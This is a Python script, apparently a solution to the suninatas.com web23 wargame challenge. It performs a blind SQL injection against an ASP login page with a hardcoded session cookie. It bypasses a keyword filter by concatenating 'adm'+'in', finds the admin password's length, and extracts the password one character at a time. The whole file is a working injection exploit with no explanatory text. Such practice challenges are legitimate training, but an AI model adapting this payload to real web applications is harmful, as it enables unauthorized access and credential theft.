#!/usr/bin/python

import requests as req

url = "http://suninatas.com/challenge/web23/web23.asp"
cookies = { "ASP.NET_SessionId":"xn25l4eqiwhk1zdpvf54polm" }
maxpw = 15
pwlen = 0
pw = ""
params = { "pw":"SQLi" }

for a in range(1, maxpw+1):
    params["id"] = "adm'+'in' and len(pw)={}--".format(a)
    response = req.get(url, cookies = cookies, params = params)
    if response.text.find("<font size=4 color=blue>admin</font>") != -1:
            print("Password Length is {}".format(a))
            pwlen = a
            break

for i in range(32, 128):
    params["id"] = "adm'+'in' and left(pw,1)='{}'--".format(chr(i))
    response = req.get(url, cookies = cookies, params = params)
    if response.text.find("<font size=4 color=blue>admin</font>") != -1:
        pw = chr(i)
        break

for i in range(1, pwlen+1):
    for j in range(32, 128):
        params["id"] = "'or right(left(pw,{}),1)='{}'--".format(i, chr(j))
        response = req.get(url, cookies = cookies, params = params)
        print("admin password is {}{}".format(pw, chr(j)), end='\r')
        if response.text.find("<font size=4 color=blue>admin</font>") != -1:
            if i == 1:
                continue
            pw += chr(j)
            break
        
print("admin password is {}".format(pw))
